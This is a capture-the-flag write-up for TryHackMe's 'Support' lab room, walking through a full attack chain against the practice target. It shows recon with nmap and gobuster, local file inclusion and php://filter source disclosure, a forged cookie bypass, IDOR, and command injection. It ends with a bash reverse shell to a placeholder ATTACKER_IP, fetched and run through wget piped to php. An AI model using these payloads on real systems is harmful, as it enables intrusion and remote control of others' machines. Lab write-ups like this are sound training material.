![Congrats](assets/screenshots/support-thm/support%20congrats.jpg)

# Support — TryHackMe
**Room Link:** [Support](https://tryhackme.com/room/support)

## Overview
The Support room on TryHackMe is a practical penetration testing challenge that simulates an internal support operations platform. The application contains multiple vulnerabilities, including Local File Inclusion (LFI), IDOR, weak session management, and command injection. The ultimate goal is to gain administrative access and achieve Remote Code Execution (RCE).

## Reconnaissance
We start with Nmap scans to identify open ports:

```bash
nmap -sC -sV -p- 10.48.169.226
```

Port 22: SSH (OpenSSH 9.6p1)
Port 80: HTTP (Apache 2.4.58)

The website is a Support Operations Panel. Directory enumeration using Gobuster:

```bash
gobuster dir -u http://10.48.169.226 -w /usr/share/wordlists/dirb/common.txt -x php
```

Interesting findings:
- `/api.php`
- `/dashboard.php`
- `/config.php`

## Identifying the LFI Vulnerability
Navigating to the dashboard page, we observe a `skin` parameter in the URL used for theme selection.

```text
http://10.48.169.226/dashboard.php?skin=default
```

We can test this parameter for Local File Inclusion (LFI):

```bash
curl -s "http://10.48.169.226/dashboard.php?skin=../../../../etc/passwd"
```
The response successfully returns the contents of `/etc/passwd`.

## Obtaining the Source Code via LFI
We use LFI combined with a PHP base64 filter to read the source code without the server executing it.

```bash
curl -s "http://10.48.169.226/dashboard.php?skin=php://filter/convert.base64-encode/resource=dashboard.php"
```

Decode it locally:
```bash
echo "base64_encoded_string_here" | base64 -d
```

We do the same for `config.php`:
```bash
curl -s "http://10.48.169.226/dashboard.php?skin=php://filter/convert.base64-encode/resource=config.php"
```

## Analysis of the Extracted Source Code
The `dashboard.php` handles user authentication and page authorization.

```php
if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true'))
```
This looks for a browser cookie named `isITUser`. If a user manually creates this cookie and sets the value to the MD5 hash of "true", they bypass the restriction.

The `config.php` reveals hardcoded secrets:
```php
$MASTER_PASSWORD = '[REDACTED]';
```

## Generating the Required Cookie Value
Generate the MD5 hash of "true":
```bash
echo -n "true" | md5sum
# Output: [REDACTED]
```

In the browser’s Developer Tools, navigate to Storage → Cookies. Edit the `isITUser` cookie value to `[REDACTED]`.

## IDOR to Confirm the Admin Account
With the modified cookie, access the API endpoint to enumerate users:
```bash
curl -s -b "isITUser=[REDACTED]" "http://10.48.169.226/api.php?id=1"
```
Admin Email Discovered: `specialadmin@support.thm`

## Login as Admin
Log in using the admin credentials extracted from the source code.
Email: `specialadmin@support.thm`
Password: `[REDACTED]`

The first flag is displayed on the dashboard!

![User Flag](assets/screenshots/support-thm/support%20firstflag.jpg)

## Command Injection for Remote Code Execution (RCE)
The admin dashboard contains a form with a dropdown designed to execute system commands (`sys` parameter).

Test for command injection with newline encoding (`%0a`):
```bash
curl -b "isITUser=[REDACTED]" -X POST http://10.48.169.226/dashboard.php -d "sys=date%0als"
```
This executes both commands successfully.

## Reverse Shell
Create a PHP reverse shell payload (`shell.php`):
```bash
echo '<?php system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""); ?>' > shell.php
```

Host the payload and set up a listener, then inject the payload:
```bash
curl -b "isITUser=[REDACTED]" -X POST http://10.48.169.226/dashboard.php -d "sys=date%0awget -q -O- http://ATTACKER_IP:8000/shell.php | php"
```

Once inside the reverse shell, read the root flag:
```bash
cat /home/ubuntu/user.txt
```
![Root Flag](assets/screenshots/support-thm/support%20secondflag.jpg)

## Tools Used
- Nmap
- Gobuster
- Curl
- Browser DevTools

## Conclusion
The Support room perfectly demonstrates how Local File Inclusion can be used to read source code and extract hardcoded passwords. Combined with insecure cookie validation, an attacker can escalate privileges and achieve remote code execution.
